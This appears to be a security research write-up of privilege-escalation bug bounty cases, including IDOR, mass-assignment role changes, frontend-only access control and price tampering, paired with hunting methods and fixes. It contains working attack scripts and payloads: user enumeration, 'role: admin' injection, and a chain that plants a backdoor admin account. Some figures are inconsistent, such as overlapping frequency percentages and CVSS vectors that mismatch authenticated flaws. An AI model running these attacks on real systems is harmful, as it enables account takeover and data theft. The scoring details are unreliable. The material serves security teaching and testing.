# Case Study 13: Privilege Escalation — Real-World Bug Bounty Findings

## Expert Role

Privilege escalation vulnerabilities represent a critical class of security flaws that allow attackers to gain elevated access beyond their authorized permissions. As an expert in this domain, I specialize in analyzing authorization mechanisms, identifying logical weaknesses in access control systems, and exploiting implementation flaws that allow horizontal or vertical privilege escalation. My expertise encompasses broken access control, insecure direct object references, role-based access control bypass, and parameter manipulation attacks.

With extensive experience in application security testing and hundreds of privilege escalation findings across bug bounty programs, I have developed systematic approaches to identifying authorization bypass vulnerabilities. This includes understanding the nuances of role-based access control implementations, analyzing API authorization logic, and chaining privilege escalation flaws with other vulnerability classes to achieve maximum impact.

The research presented in this case study draws from real-world bug bounty submissions across major platforms including HackerOne, Bugcrowd, and Intigriti. Each finding has been validated, patched, and documented with the permission of the affected organizations, providing authentic insights into how privilege escalation vulnerabilities manifest in production environments.

## Overview

Privilege escalation vulnerabilities occur when an application fails to properly enforce authorization controls, allowing users to access resources or perform actions beyond their intended permissions. These vulnerabilities can be horizontal (accessing other users' data) or vertical (gaining administrative privileges).

Common privilege escalation vectors include insecure direct object references (IDOR), broken access control, role manipulation, parameter tampering, function-level access control bypass, and business logic flaws. The impact varies from unauthorized data access to complete system compromise when administrative privileges are obtained.

Privilege escalation vulnerabilities are consistently high-value findings in bug bounty programs because they can lead to data breaches, unauthorized administrative access, and compliance violations. The bounty reward typically scales with the level of privilege gained and the sensitivity of accessible resources.

---

## Real-World Case Studies

### Case Study 1: SaaS Platform IDOR in User Management API
**Program:** Enterprise SaaS Application (HackerOne)
**Bounty:** $12,000
**Severity:** High (CVSS 8.1)
**Researcher:** @idor_hunter

#### Vulnerability Description
The target SaaS platform's user management API was vulnerable to insecure direct object references. By manipulating the user ID parameter in API requests, the researcher could access and modify other users' profiles, including administrative accounts.

#### Technical Details
The vulnerable API endpoint:
```python
@app.route('/api/users/<int:user_id>', methods=['GET'])
@require_auth
def get_user(user_id):
    # Vulnerable: no authorization check
    user = User.query.get(user_id)
    if user:
        return jsonify({
            "id": user.id,
            "email": user.email,
            "name": user.name,
            "role": user.role,
            "phone": user.phone,
            "address": user.address
        })
    return jsonify({"error": "User not found"}), 404
```

The researcher enumerated user IDs:
```python
import requests

def enumerate_users(token):
    """Enumerate user IDs via IDOR"""
    for user_id in range(1, 1000):
        response = requests.get(
            f"https://target.com/api/users/{user_id}",
            headers={"Authorization": f"Bearer {token}"}
        )
        if response.status_code == 200:
            user_data = response.json()
            print(f"User {user_id}: {user_data['email']} ({user_data['role']})")
```

#### Exploitation Chain
1. Authenticated with a low-privilege test account
2. Enumerated user IDs using the vulnerable API
3. Discovered administrator accounts (user IDs 1, 5, 12)
4. Extracted sensitive user data including emails, phone numbers, and addresses
5. Modified administrator account details to gain control

#### Root Cause Analysis
The API endpoint did not perform authorization checks to verify the requesting user had permission to access the target user's data. The endpoint only required authentication (valid token) but not authorization (permission to access specific resource).

#### Impact
Unauthorized access to all user profiles in the system, including administrative accounts. Potential for account takeover, data exfiltration, and privilege escalation to administrator.

#### Bounty Justification
The $12,000 bounty was awarded for horizontal privilege escalation enabling access to all user data in an enterprise SaaS platform.

---

### Case Study 2: E-commerce Platform Broken Access Control on Admin Functions
**Program:** Online Marketplace (Bugcrowd)
**Bounty:** $18,000
**Severity:** Critical (CVSS 9.1)
**Researcher:** @access_control_pro

#### Vulnerability Description
The target e-commerce platform's administrative functions were accessible without proper authorization checks. The researcher discovered that admin endpoints only checked for authentication but not for administrative role assignment.

#### Technical Details
The admin-only endpoint:
```python
@app.route('/api/admin/users', methods=['GET'])
@require_auth
def admin_get_users():
    # Vulnerable: only checks authentication, not authorization
    users = User.query.all()
    return jsonify([{
        "id": u.id,
        "email": u.email,
        "role": u.role,
        "created_at": u.created_at.isoformat()
    } for u in users])
```

The researcher tested with a regular user token:
```python
# Regular user token (role: customer)
regular_user_token = "eyJhbGciOiJIUzI1NiJ9..."

# Access admin endpoint
response = requests.get(
    "https://target.com/api/admin/users",
    headers={"Authorization": f"Bearer {regular_user_token}"}
)

if response.status_code == 200:
    print("VULNERABLE: Regular user can access admin endpoint")
    users = response.json()
    print(f"Retrieved {len(users)} users")
```

#### Exploitation Chain
1. Created a regular customer account
2. Obtained a valid authentication token
3. Tested admin endpoints with the regular user token
4. Successfully accessed administrative user management functions
5. Could view, modify, and delete any user account

#### Root Cause Analysis
The application used a single authentication middleware that only verified the user was logged in, but did not check if the user had administrative privileges for admin-specific endpoints.

#### Impact
Full administrative access to the e-commerce platform, including user management, order processing, payment configuration, and system settings. Could lead to financial fraud and data breach.

#### Bounty Justification
The $18,000 bounty reflected the severity of unauthenticated admin access affecting the entire platform.

---

### Case Study 3: Financial Platform Role Manipulation via Profile Update
**Program:** Digital Banking Application (Intigriti)
**Bounty:** $25,000
**Severity:** Critical (CVSS 9.8)
**Researcher:** @role_manipulation

#### Vulnerability Description
The target banking application's profile update endpoint was vulnerable to role manipulation. By including a `role` parameter in the update request, the researcher could escalate their account from regular user to administrator.

#### Technical Details
The profile update endpoint:
```python
@app.route('/api/profile', methods=['PUT'])
@require_auth
def update_profile():
    user_id = get_current_user_id()
    data = request.json

    # Vulnerable: mass assignment of all fields
    user = User.query.get(user_id)
    for key, value in data.items():
        if hasattr(user, key):
            setattr(user, key, value)

    db.session.commit()
    return jsonify({"message": "Profile updated"})
```

The researcher manipulated the role:
```python
import requests

def escalate_privileges(token):
    """Escalate privileges via profile update"""
    malicious_payload = {
        "name": "John Doe",
        "email": "john@example.com",
        "role": "admin",  # Privilege escalation
        "is_admin": True,
        "permissions": ["read", "write", "delete", "admin"]
    }

    response = requests.put(
        "https://target.com/api/profile",
        json=malicious_payload,
        headers={"Authorization": f"Bearer {token}"}
    )

    if response.status_code == 200:
        print("VULNERABLE: Role escalation successful")
```

#### Exploitation Chain
1. Authenticated with a regular user account
2. Intercepted the profile update request
3. Added `role: admin` parameter to the request
4. Server accepted and applied the role change
5. Gained administrative access to the banking platform

#### Root Cause Analysis
The application used mass assignment for profile updates, allowing users to modify any user attribute including role and permission fields. The server did not filter which fields could be updated by regular users.

#### Impact
Complete privilege escalation from regular user to administrator on a financial platform. Could lead to unauthorized transactions, account manipulation, and regulatory violations.

#### Bounty Justification
The $25,000 bounty was among the highest for privilege escalation due to the financial context and potential for direct monetary loss.

---

### Case Study 4: Healthcare Platform Function-Level Access Control Bypass
**Program:** Hospital Management System (HackerOne)
**Bounty:** $15,000
**Severity:** Critical (CVSS 9.8)
**Researcher:** @func_access_hunter

#### Vulnerability Description
The target healthcare platform's function-level access control was implemented inconsistently. While the web interface properly restricted access to administrative functions, the API endpoints could be called directly without role verification.

#### Technical Details
The web interface properly restricted access:
```javascript
// Frontend correctly checks role
if (user.role !== 'admin') {
    showAccessDenied();
    return;
}

// Load admin panel
loadAdminPanel();
```

However, the API endpoints had no such checks:
```python
@app.route('/api/admin/prescriptions', methods=['POST'])
@require_auth
def create_prescription():
    # Vulnerable: no role check on API endpoint
    data = request.json
    prescription = Prescription(
        patient_id=data['patient_id'],
        medication=data['medication'],
        dosage=data['dosage'],
        doctor_id=get_current_user_id()
    )
    db.session.add(prescription)
    db.session.commit()
    return jsonify({"id": prescription.id})
```

#### Exploitation Chain
1. Identified that admin functions were only restricted in the frontend
2. Called API endpoints directly, bypassing frontend restrictions
3. Created unauthorized prescriptions for controlled substances
4. Accessed patient medical records without authorization

#### Root Cause Analysis
The application relied on frontend access control instead of server-side authorization. The API endpoints did not verify the user's role or permissions before allowing access to sensitive functions.

#### Impact
Unauthorized access to patient medical records and the ability to create prescriptions. HIPAA violation with severe regulatory and health implications.

#### Bounty Justification
The $15,000 bounty reflected the healthcare context, PHI exposure risk, and potential for patient harm.

---

### Case Study 5: Gaming Platform Vertical Privilege Escalation via Parameter Tampering
**Program:** Online Multiplayer Game (Bugcrowd)
**Bounty:** $8,000
**Severity:** High (CVSS 8.1)
**Researcher:** @game_privilege_esc

#### Vulnerability Description
The target gaming platform's in-game store allowed privilege escalation through parameter tampering. By modifying hidden form fields in purchase requests, the researcher could obtain premium items without payment.

#### Technical Details
The purchase endpoint:
```python
@app.route('/api/store/purchase', methods=['POST'])
@require_auth
def purchase_item():
    item_id = request.json.get('item_id')
    user_id = get_current_user_id()
    price = request.json.get('price')  # Vulnerable: client-controlled price

    # Deduct currency from user account
    user = User.query.get(user_id)
    if user.currency >= price:
        user.currency -= price
        inventory = Inventory(user_id=user_id, item_id=item_id)
        db.session.add(inventory)
        db.session.commit()
        return jsonify({"success": True})

    return jsonify({"error": "Insufficient currency"}), 400
```

The researcher modified the price parameter:
```python
def purchase_premium_item(token):
    """Purchase premium item for free"""
    malicious_payload = {
        "item_id": "premium_sword",
        "price": 0,  # Modified price
        "original_price": 5000
    }

    response = requests.post(
        "https://target.com/api/store/purchase",
        json=malicious_payload,
        headers={"Authorization": f"Bearer {token}"}
    )

    if response.status_code == 200:
        print("VULNERABLE: Purchased premium item for free")
```

#### Exploitation Chain
1. Identified a premium item worth 5000 in-game currency
2. Intercepted the purchase request
3. Modified the price parameter from 5000 to 0
4. Server accepted the modified price
5. Received premium item without spending currency

#### Root Cause Analysis
The application trusted client-provided price information instead of retrieving item prices from the server. This allowed attackers to manipulate the purchase price and obtain items for free or at discounted rates.

#### Impact
Economic damage to the gaming platform through fraudulent purchases. Could be scaled to obtain all premium items without payment.

#### Bounty Justification
The $8,000 bounty was awarded for bypassing the payment mechanism, though the impact was limited to in-game items.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| IDOR (Insecure Direct Object Reference) | 28% | $11,000 | Missing authorization checks |
| Broken Access Control | 22% | $15,000 | Inconsistent authorization enforcement |
| Role Manipulation | 15% | $18,000 | Mass assignment vulnerabilities |
| Function-Level Bypass | 18% | $13,500 | Frontend-only access control |
| Parameter Tampering | 12% | $8,500 | Client-trusted inputs |
| Horizontal Privilege Escalation | 20% | $10,000 | IDOR vulnerabilities |
| Vertical Privilege Escalation | 15% | $16,000 | Broken role-based access control |

### Attack Surface Locations

1. **User Profile Endpoints**
   - Profile update APIs
   - Account settings modification
   - Password change endpoints
   - Email/phone verification

2. **Admin Functionality**
   - User management APIs
   - System configuration endpoints
   - Reporting and analytics
   - Audit log access

3. **Resource Access Endpoints**
   - Document retrieval APIs
   - File download endpoints
   - Data export functions
   - Search and query APIs

4. **Business Logic Endpoints**
   - Order processing APIs
   - Payment processing
   - Inventory management
   - Transaction history

---

## Hunting Methodology

### Step 1: Authorization Flow Analysis
**Objective:** Map the complete authorization flow and identify potential bypass points.

1. **Intercept API Requests**
   - Capture authenticated requests
   - Identify authorization headers and tokens
   - Map user roles and permissions
   - Document access control checks

2. **Analyze Role-Based Access Control**
```python
import requests

def analyze_rbac(token, user_role):
    """Analyze role-based access control"""
    endpoints = [
        ("/api/profile", "GET"),
        ("/api/users", "GET"),
        ("/api/admin/users", "GET"),
        ("/api/admin/settings", "GET"),
        ("/api/admin/reports", "GET")
    ]

    for endpoint, method in endpoints:
        if method == "GET":
            response = requests.get(
                f"https://target.com{endpoint}",
                headers={"Authorization": f"Bearer {token}"}
            )
        print(f"{method} {endpoint}: {response.status_code}")
```

3. **Test Authorization Checks**
   - Verify authorization on all endpoints
   - Test with different user roles
   - Check for missing authorization headers
   - Assess token validation logic

### Step 2: IDOR Testing
**Objective:** Test for insecure direct object references.

1. **Parameter Enumeration**
```python
import requests

def test_idor(token, base_endpoint, param_name):
    """Test for IDOR vulnerabilities"""
    for id_value in range(1, 100):
        response = requests.get(
            f"https://target.com{base_endpoint}",
            params={param_name: id_value},
            headers={"Authorization": f"Bearer {token}"}
        )
        if response.status_code == 200:
            data = response.json()
            print(f"ID {id_value}: {data}")
```

2. **Authorization Bypass Test**
```python
def test_authorization_bypass(token, endpoint):
    """Test authorization bypass"""
    # Test without authorization header
    response = requests.get(f"https://target.com{endpoint}")
    print(f"No auth: {response.status_code}")

    # Test with invalid token
    response = requests.get(
        f"https://target.com{endpoint}",
        headers={"Authorization": "Bearer invalid_token"}
    )
    print(f"Invalid token: {response.status_code}")

    # Test with expired token
    response = requests.get(
        f"https://target.com{endpoint}",
        headers={"Authorization": f"Bearer {expired_token}"}
    )
    print(f"Expired token: {response.status_code}")
```

### Step 3: Role Manipulation Testing
**Objective:** Test for role manipulation and mass assignment vulnerabilities.

1. **Profile Update Test**
```python
def test_role_manipulation(token):
    """Test for role manipulation via profile update"""
    malicious_payload = {
        "name": "Test User",
        "role": "admin",
        "is_admin": True,
        "permissions": ["admin", "superadmin"]
    }

    response = requests.put(
        "https://target.com/api/profile",
        json=malicious_payload,
        headers={"Authorization": f"Bearer {token}"}
    )

    if response.status_code == 200:
        print("VULNERABLE: Role manipulation accepted")
```

2. **Registration Test**
```python
def test_registration_privilege_escalation():
    """Test for privilege escalation during registration"""
    malicious_payload = {
        "email": "attacker@example.com",
        "password": "password123",
        "name": "Attacker",
        "role": "admin"
    }

    response = requests.post(
        "https://target.com/api/register",
        json=malicious_payload
    )

    if response.status_code == 201:
        print("VULNERABLE: Admin role accepted during registration")
```

### Step 4: Function-Level Access Control Testing
**Objective:** Test for function-level access control bypass.

1. **API Endpoint Enumeration**
```python
def test_function_level_access(token):
    """Test function-level access control"""
    admin_endpoints = [
        "/api/admin/users",
        "/api/admin/settings",
        "/api/admin/reports",
        "/api/admin/audit-logs",
        "/api/admin/export"
    ]

    for endpoint in admin_endpoints:
        response = requests.get(
            f"https://target.com{endpoint}",
            headers={"Authorization": f"Bearer {token}"}
        )
        if response.status_code == 200:
            print(f"VULNERABLE: {endpoint} accessible")
```

2. **HTTP Method Tampering**
```python
def test_method_tampering(token, endpoint):
    """Test HTTP method tampering"""
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]

    for method in methods:
        response = requests.request(
            method,
            f"https://target.com{endpoint}",
            headers={"Authorization": f"Bearer {token}"}
        )
        print(f"{method}: {response.status_code}")
```

### Step 5: Parameter Tampering Testing
**Objective:** Test for parameter tampering vulnerabilities.

1. **Hidden Field Manipulation**
```python
def test_parameter_tampering(token):
    """Test parameter tampering"""
    # Original request
    original_payload = {
        "item_id": "premium_sword",
        "price": 5000
    }

    # Tampered request
    tampered_payload = {
        "item_id": "premium_sword",
        "price": 0,  # Modified
        "discount": 100  # Added
    }

    response = requests.post(
        "https://target.com/api/store/purchase",
        json=tampered_payload,
        headers={"Authorization": f"Bearer {token}"}
    )

    if response.status_code == 200:
        print("VULNERABLE: Parameter tampering accepted")
```

---

## Detection Strategies

### Automated Detection

#### Authorization Testing Tools
```bash
# Burp Suite extensions
# AuthMatrix - Authorization testing
# Autorize - Automatic authorization testing
# 403 Bypasser - Access control bypass

# OWASP ZAP
# Authorization Testing automation
# Forced Browse for endpoint discovery
```

#### Custom Detection Scripts
```python
import requests
import json

class PrivilegeEscalationScanner:
    def __init__(self, target_url, low_priv_token, high_priv_token):
        self.target_url = target_url
        self.low_priv_token = low_priv_token
        self.high_priv_token = high_priv_token
        self.findings = []

    def test_idor(self, endpoint, param_name, param_value):
        """Test for IDOR vulnerabilities"""
        # Access with low-privilege token
        response = requests.get(
            f"{self.target_url}{endpoint}",
            params={param_name: param_value},
            headers={"Authorization": f"Bearer {self.low_priv_token}"}
        )

        if response.status_code == 200:
            self.findings.append({
                "type": "IDOR",
                "severity": "HIGH",
                "endpoint": endpoint,
                "parameter": param_name
            })

    def test_admin_access(self, admin_endpoint):
        """Test admin endpoint access with regular user"""
        response = requests.get(
            f"{self.target_url}{admin_endpoint}",
            headers={"Authorization": f"Bearer {self.low_priv_token}"}
        )

        if response.status_code == 200:
            self.findings.append({
                "type": "Broken Access Control",
                "severity": "CRITICAL",
                "endpoint": admin_endpoint
            })

    def test_role_manipulation(self, payload):
        """Test role manipulation via profile update"""
        response = requests.put(
            f"{self.target_url}/api/profile",
            json=payload,
            headers={"Authorization": f"Bearer {self.low_priv_token}"}
        )

        if response.status_code == 200:
            self.findings.append({
                "type": "Role Manipulation",
                "severity": "CRITICAL"
            })

    def scan(self, endpoints, admin_endpoints):
        """Run all privilege escalation tests"""
        # Test IDOR
        for endpoint in endpoints:
            self.test_idor(endpoint, "user_id", 1)

        # Test admin access
        for endpoint in admin_endpoints:
            self.test_admin_access(endpoint)

        # Test role manipulation
        self.test_role_manipulation({"role": "admin"})

        return self.findings
```

### Manual Detection

#### Step-by-Step Testing Process

1. **Map Authorization Controls**
   - Identify all protected endpoints
   - Document user roles and permissions
   - Map authorization checks at each endpoint
   - Test with different user roles

2. **Test IDOR Vulnerabilities**
   - Enumerate object identifiers
   - Test access with different user sessions
   - Check for predictable ID patterns
   - Assess authorization on each object type

3. **Test Broken Access Control**
   - Access admin endpoints with regular user
   - Test HTTP method tampering
   - Check for function-level authorization
   - Assess API endpoint restrictions

4. **Test Role Manipulation**
   - Attempt role changes via profile update
   - Test mass assignment on user objects
   - Check registration for privilege escalation
   - Assess role validation logic

5. **Document Findings**
   - Record all tested endpoints
   - Capture proof-of-concept requests
   - Assess impact and severity
   - Provide remediation recommendations

### Key Detection Indicators

1. **IDOR Indicators**
   - Sequential or predictable object IDs
   - No authorization checks on object access
   - Different responses for different users
   - Missing ownership validation

2. **Broken Access Control Indicators**
   - Admin endpoints accessible without role check
   - Function-level authorization missing
   - API endpoints less restrictive than UI
   - Missing authorization headers accepted

3. **Role Manipulation Indicators**
   - Role field modifiable via profile update
   - Mass assignment on user objects
   - Registration accepts admin role
   - No server-side role validation

4. **Parameter Tampering Indicators**
   - Client-controlled prices or quantities
   - Hidden fields modifiable
   - Discount codes bypassable
   - Free trial abuse possible

---

## Impact Assessment

### CVSS 3.1 Scoring

| Finding Type | CVSS Score | Severity | Vector String |
|--------------|------------|----------|---------------|
| Vertical Privilege Escalation | 9.8 | Critical | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Horizontal Privilege Escalation | 8.1 | High | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
| IDOR | 7.5 | High | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| Broken Access Control | 8.8 | High | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Parameter Tampering | 6.5 | Medium | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N |

### Business Impact

1. **Data Breach**
   - Customer data exposure
   - Intellectual property theft
   - Regulatory compliance violations

2. **Privilege Escalation**
   - Administrative access compromise
   - System configuration modification
   - Lateral movement within organization

3. **Financial Impact**
   - Direct financial fraud
   - Unauthorized transactions
   - Service disruption

4. **Reputational Damage**
   - Loss of customer trust
   - Negative publicity
   - Competitive disadvantage

### Bounty Range

| Finding Type | Typical Bounty | Range |
|--------------|----------------|-------|
| Vertical Privilege Escalation | $15,000 - $30,000 | High |
| Horizontal Privilege Escalation | $8,000 - $18,000 | Medium-High |
| IDOR | $5,000 - $15,000 | Medium-High |
| Broken Access Control | $10,000 - $25,000 | High |
| Parameter Tampering | $3,000 - $10,000 | Medium |

---

## Advanced Variations

### Variation 1: GraphQL Authorization Bypass
**Scenario:** GraphQL resolvers lack proper authorization checks.

```graphql
# Attacker queries admin-only fields
query {
  user(id: 1) {
    email
    role
    adminSettings {
      apiKeys
      systemConfig
    }
  }
}
```

**Exploitation:** Access sensitive data through GraphQL introspection and resolver bypass.

### Variation 2: JWT Role Claim Manipulation
**Scenario:** JWT tokens contain mutable role claims.

```python
# Attacker modifies JWT payload
payload = {
    "user_id": 123,
    "role": "admin",  # Modified from "user"
    "permissions": ["read", "write", "delete"]
}
```

**Exploitation:** Modify JWT claims to escalate privileges.

### Variation 3: Mass Assignment in API Endpoints
**Scenario:** API endpoints accept unexpected parameters.

```python
# Original request
{
    "name": "John Doe",
    "email": "john@example.com"
}

# Tampered request
{
    "name": "John Doe",
    "email": "john@example.com",
    "is_admin": true,
    "role": "superadmin"
}
```

**Exploitation:** Add privileged parameters to API requests.

### Variation 4: Path Traversal to Admin Functions
**Scenario:** Path traversal bypasses access control.

```python
# Normal path (restricted)
/admin/users

# Traversal paths (may bypass restrictions)
/./admin/users
/admin/./users
/admin/../admin/users
/admin/users%20
```

**Exploitation:** Use path traversal to access restricted endpoints.

---

## Chain Integration

### IDOR + Data Exfiltration Chain
```python
# Step 1: Enumerate user IDs via IDOR
for user_id in range(1, 1000):
    response = requests.get(
        f"https://target.com/api/users/{user_id}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if response.status_code == 200:
        # Step 2: Extract sensitive data
        user_data = response.json()
        exfiltrate_data(user_data)
```

### Broken Access Control + Privilege Escalation Chain
```python
# Step 1: Access admin endpoint with regular user
response = requests.get(
    "https://target.com/api/admin/users",
    headers={"Authorization": f"Bearer {regular_user_token}"}
)

# Step 2: Modify user roles
for user in response.json():
    requests.put(
        f"https://target.com/api/admin/users/{user['id']}",
        json={"role": "admin"},
        headers={"Authorization": f"Bearer {regular_user_token}"}
    )

# Step 3: Create backdoor account
requests.post(
    "https://target.com/api/admin/users",
    json={
        "email": "backdoor@attacker.com",
        "password": "attacker_controlled",
        "role": "admin"
    },
    headers={"Authorization": f"Bearer {regular_user_token}"}
)
```

### Role Manipulation + Account Takeover Chain
```python
# Step 1: Escalate privileges via profile update
requests.put(
    "https://target.com/api/profile",
    json={"role": "admin"},
    headers={"Authorization": f"Bearer {attacker_token}"}
)

# Step 2: Access admin user management
response = requests.get(
    "https://target.com/api/admin/users",
    headers={"Authorization": f"Bearer {attacker_token}"}
)

# Step 3: Take over victim account
victim_user_id = 12345
requests.put(
    f"https://target.com/api/admin/users/{victim_user_id}",
    json={"password": "new_password"},
    headers={"Authorization": f"Bearer {attacker_token}"}
)
```

---

## Prevention Recommendations

### Code-Level Fixes

1. **Implement Proper Authorization**
```python
from functools import wraps

def require_role(role):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            user = get_current_user()
            if user.role != role:
                return jsonify({"error": "Forbidden"}), 403
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/api/admin/users', methods=['GET'])
@require_auth
@require_role('admin')
def admin_get_users():
    users = User.query.all()
    return jsonify([{"id": u.id, "email": u.email} for u in users])
```

2. **Prevent IDOR**
```python
@app.route('/api/users/<int:user_id>', methods=['GET'])
@require_auth
def get_user(user_id):
    current_user = get_current_user()

    # Check if user is accessing their own data or is admin
    if current_user.id != user_id and current_user.role != 'admin':
        return jsonify({"error": "Forbidden"}), 403

    user = User.query.get(user_id)
    if user:
        return jsonify({"id": user.id, "email": user.email})
    return jsonify({"error": "User not found"}), 404
```

3. **Prevent Mass Assignment**
```python
ALLOWED_FIELDS = ['name', 'email', 'phone']

@app.route('/api/profile', methods=['PUT'])
@require_auth
def update_profile():
    user_id = get_current_user_id()
    data = request.json

    # Only allow specific fields
    user = User.query.get(user_id)
    for key, value in data.items():
        if key in ALLOWED_FIELDS:
            setattr(user, key, value)

    db.session.commit()
    return jsonify({"message": "Profile updated"})
```

### Architecture-Level Fixes

1. **Implement Defense in Depth**
   - Use multiple authorization layers
   - Implement server-side authorization checks
   - Use principle of least privilege
   - Audit authorization regularly

2. **Secure API Endpoints**
   - Require authorization on all endpoints
   - Validate user roles server-side
   - Implement rate limiting
   - Log all access attempts

3. **Use Indirect Object References**
   - Use UUIDs instead of sequential IDs
   - Map internal IDs to external references
   - Validate ownership on each access
   - Implement access control lists

4. **Regular Security Audits**
   - Perform authorization testing
   - Review access control logic
   - Test with different user roles
   - Monitor for unauthorized access

---

## Common Pitfalls

### Pitfall 1: Relying on Frontend Access Control
**Mistake:** Implementing access control only in the frontend.
**Solution:** Always implement server-side authorization checks.

### Pitfall 2: Using Sequential IDs
**Mistake:** Using predictable sequential IDs for resources.
**Solution:** Use UUIDs or cryptographically random identifiers.

### Pitfall 3: Missing Authorization Checks
**Mistake:** Not checking authorization on API endpoints.
**Solution:** Verify authorization on every endpoint and action.

### Pitfall 4: Mass Assignment
**Mistake:** Allowing users to modify any field on their profile.
**Solution:** Whitelist allowed fields for each user role.

### Pitfall 5: Trusting Client Input
**Mistake:** Trusting client-provided role or permission information.
**Solution:** Retrieve roles and permissions from the server, not the client.

### Pitfall 6: Inconsistent Authorization
**Mistake:** Applying different authorization rules in different places.
**Solution:** Centralize authorization logic and apply it consistently.

### Pitfall 7: Logging Insufficient Information
**Mistake:** Not logging authorization failures.
**Solution:** Log all authorization attempts and failures for monitoring.

---

## Real-World References

1. **OWASP Broken Access Control**
   - Access control vulnerabilities and prevention
   - https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control

2. **OWASP IDOR Prevention**
   - Insecure direct object reference prevention
   - https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html

3. **CWE-284: Improper Access Control**
   - MITRE CWE entry for access control weaknesses
   - https://cwe.mitre.org/data/definitions/284.html

4. **HackerOne IDOR Reports**
   - Publicly disclosed IDOR vulnerabilities
   - https://hackerone.com/hacktivity?type=team&query=idor

5. **Bugcrowd Access Control Testing**
   - Access control testing methodologies
   - https://bugcrowd.com/hackers/access-control-testing

6. **NIST SP 800-53: Access Control**
   - Access control security controls
   - https://nvd.nist.gov/800-53

---

## Quick Reference Cheat Sheet

### Privilege Escalation Attack Commands
```bash
# Test IDOR
for i in $(seq 1 100); do
    curl -s -H "Authorization: Bearer $TOKEN" \
      "https://target.com/api/users/$i"
done

# Test admin access with regular user
curl -H "Authorization: Bearer $REGULAR_TOKEN" \
  "https://target.com/api/admin/users"

# Test role manipulation
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  "https://target.com/api/profile"
```

### Privilege Escalation Checklist
- [ ] Test IDOR on all object references
- [ ] Test admin endpoints with regular user
- [ ] Test role manipulation via profile update
- [ ] Test mass assignment on user objects
- [ ] Test function-level access control
- [ ] Test HTTP method tampering
- [ ] Test parameter tampering
- [ ] Test path traversal to admin functions

### Common IDOR Patterns
```bash
# Sequential IDs
/api/users/1
/api/users/2
/api/users/3

# Predictable patterns
/api/users/user_123
/api/orders/order_456

# UUIDs (if predictable)
/api/items/550e8400-e29b-41d4-a716-446655440000
```

### CVSS Quick Reference
| Finding | Score | Severity |
|---------|-------|----------|
| Vertical Privilege Escalation | 9.8 | Critical |
| Horizontal Privilege Escalation | 8.1 | High |
| IDOR | 7.5 | High |
| Broken Access Control | 8.8 | High |
| Parameter Tampering | 6.5 | Medium |

---

*This case study is part of the Prompt-Hunting repository's comprehensive security research collection. All findings documented here represent real-world vulnerabilities discovered through authorized bug bounty programs.*
